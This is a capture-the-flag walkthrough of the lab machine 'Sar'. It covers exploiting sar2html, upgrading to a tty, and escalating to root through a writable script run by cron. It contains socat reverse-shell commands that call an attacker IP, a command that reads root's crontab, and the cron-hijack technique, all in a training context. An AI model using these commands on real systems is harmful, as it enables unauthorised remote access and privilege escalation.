# PG Play - Sar
## Author: Love Sharma
## Released on: Jul 20, 2020
### Difficulty: Easy
### Community Difficulty: Easy
### Description: This is not a conventional foothold-privesc type of machine. Only proof.txt is a valid flag.
| Step: | Notes: |
| --- | --- |
| 1. | I ran a all ports nmap scan without a T4 switch to get started and ran another in parallel for speed with a T4 switch and of only common ports. |
| 2. | My fast NMAP scan found port 80 opened out of habit I manually checked for common files in the web directory, and found sar2html in robots.txt. |
| 3. | I found an exploit for sar2html which I figured I'd test out real quick. https://github.com/AssassinUKG/sar2HTML&ved=2ahUKEwi64tH145iFAxWepVYBHRJtC3gQFnoECAsQAQ&usg=AOvVaw09b6JcvNV9blzX1NKL5321 |
| 4. | This gave me a foothold with a dumb shell as the www user, I now needed to spawn a tty shell. |
| 5. | I tested a few different types of tty shell spawns, php, python, nc (no -e because of version issue but the nc tty without a -e didn't work either) the one that worked was a socat used below commands |
| 5.1 | On my attack box ```socat file:`tty`,raw,echo=0 tcp-listen:4444``` |
| 5.2 | On the target ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444``` | 
| 6. | I'd transferred linpeas over earlier with the dumb shell but made it a priority to get a tty first. I found that I had access to the /var/spool/cron/crontabs folder which included cron jobs for the root user. I discovered that a script called finally.sh ran on every 5th minute as a cron job this file was only executable and readable by me. |
| 6.1 | I found another nice command that could of found this cron job quicker: ```cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"``` |
| 7. | I navigated to the finally.sh file at ```/var/www/html/finally.sh``` |
| 8. | When I read the finally.sh I found the scripts only purpose is to run another script called write.sh every 5th minute, I had read, write and execute permissions of the write.sh file. All the write.sh file did was create a empty file in the tmp directory called gateway. |
| 9. | I modified write.sh to include the socat reverse shell, since the cronjob for finally.sh ran every 5 minutes it would provide me, in theory which a reverse shell as root. |
| 10. | This worked and I was able to obtain the proof.txt for this machine |
| --- | --- |
|Lessons Learnt: |
| 1. | This machine reminded me of a couple of things I learnt from the TCM Academy course on Ethical hacking, which was taking advantage of files that were either directly ran as root and I was capable of modifying. |
| 2. | The value of a tty shell |
| --- | --- |
